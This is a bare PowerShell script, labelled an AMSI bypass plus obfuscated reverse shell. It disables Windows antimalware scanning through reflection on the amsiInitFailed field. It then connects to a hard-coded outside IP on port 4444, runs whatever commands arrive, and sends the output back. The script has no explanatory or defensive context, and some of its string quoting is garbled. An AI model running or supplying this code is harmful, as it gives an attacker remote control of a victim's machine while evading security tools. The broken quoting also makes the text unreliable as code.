# --- AMSI bypass + obfuscated reverse shell in one script ---
$s='am';$m='si';$n='utils';$f=$s+$m
$u=[Ref].Assembly.GetType('System.Management.Automation.A'+$f)
$b=$u.GetField('a'+$f+'InitFailed','NonPublic,Static')
$b.SetValue($null,$true)

$X= 'N'+'e'+'w'+'-'+'O'+'b'+'j'+'e'+'c'+'t'
$I= $X + ' ' + 'N'+'e'+'t'+'.'+'S'+'o'+'c'+'k'+'e'+'t'+'s'+'.'+'T'+'C'+'P'+'C'+'l'+'i'+'e'+'n'+'t'
$Y= $X + ' ' + 'b'+'y'+'t'+'e'+'['+']'
$H = '54.123.45.67'; $P = 4444
$c = iex "$I('$H',$P)"
$s = $c.('G'+'e'+'t'+'S'+'t'+'r'+'e'+'a'+'m').Invoke()
$b = iex "$Y 0..65535|%{0}"
while(($i = $s.('R'+'e'+'a'+'d').Invoke($b,0,$b.Length)) -ne 0){
    $d = (iex $X + ' -TypeName ' + 'S'+'y'+'s'+'t'+'e'+'m'+'.'+'T'+'e'+'x'+'t'+'.'+'A'+'S'+'C'+'I'+'I'+'E'+'n'+'c'+'o'+'d'+'i'+'n'+'g').('G'+'e'+'t'+'S'+'t'+'r'+'i'+'n'+'g').Invoke($b,0,$i)
    $sb = (iex $d 2>&1 | Out-String );
    $sb2 = $sb + 'PS ' + (pwd).Path + '> ';
    $send = ([t'+'e'+'x'+'t'+'.'+'e'+'n'+'c'+'o'+'d'+'i'+'n'+'g']::A'+'S'+'C'+'I'+'I).('G'+'e'+'t'+'B'+'y'+'t'+'e'+'s').Invoke($sb2)
    $s.('W'+'r'+'i'+'t'+'e').Invoke($send,0,$send.Length)
    $s.('F'+'l'+'u'+'s'+'h').Invoke()
}
$c.('C'+'l'+'o'+'s'+'e').Invoke()
# --- End script ---
